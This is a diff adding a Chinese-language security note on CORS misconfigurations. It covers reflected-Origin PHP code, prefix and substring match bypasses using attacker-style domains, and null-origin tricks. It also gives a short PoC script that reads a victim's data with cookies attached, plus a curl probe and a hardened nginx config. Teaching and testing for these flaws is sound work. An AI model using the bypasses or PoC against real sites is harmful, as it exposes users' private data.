@@ -1,0 +1,86 @@
+# CORS 跨域安全
+
+> Cross-Origin Resource Sharing — 跨域资源共享配置漏洞
+
+## 常见配置错误
+
+### 1. Access-Control-Allow-Origin: *
+```http
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true   ← 和 * 不能共存！
+```
+
+**注意**: `Access-Control-Allow-Origin: *` 和 `Access-Control-Allow-Credentials: true` 不能同时使用，规范禁止。
+
+### 2. 反射 Origin（最危险）
+```php
+// 直接将请求的 Origin 反射回去
+header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
+header("Access-Control-Allow-Credentials: true");
+
+// 攻击者可以构造恶意页面读取用户数据
+```
+
+### 3. Origin 前缀匹配不当
+```php
+// 检查 origin 是否以 https://trusted.com 开头
+// 绕过: https://trusted.com.attacker.com
+// 绕过: https://trusted.comattacker.com
+// 绕过: https://trusted.com.evil.com
+```
+
+### 4. Origin 包含匹配不当
+```php
+// 检查 origin 是否包含 trusted.com
+// 绕过: https://trusted.com.attacker.com
+// 绕过: https://nottrusted.com/?x=trusted.com
+```
+
+### 5. null Origin
+```http
+Origin: null
+
+// 某些服务错误地允许 null origin
+// 可通过 sandboxed iframe 构造 null origin
+```
+
+## 漏洞验证
+
+```html
+<!-- PoC: 读取受害者数据 -->
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onload = function() {
+    alert(xhr.responseText);  // 读取到敏感数据
+};
+xhr.open('GET', 'https://target.com/api/userinfo', true);
+xhr.withCredentials = true;  // 携带Cookie
+xhr.send();
+</script>
+```
+
+## 利用场景
+
+1. **内网应用** — 读取内网应用的返回内容
+2. **API 接口** — 向有 CORS 配置漏洞的 API 发请求获取用户数据
+3. **SSRF + CORS** — 配合 SSRF 绕过同源策略
+
+## 安全配置
+
+```nginx
+# 只允许特定域名
+add_header Access-Control-Allow-Origin "https://trusted.com";
+add_header Access-Control-Allow-Credentials "true";
+
+# 不允许通配符 + Credentials
+```
+
+## Tools
+```bash
+# curl 测试
+curl -H "Origin: https://evil.com" -I https://target.com/api/user
+
+# Burp 扫描器
+# Active Scan → CORS 检测
+```
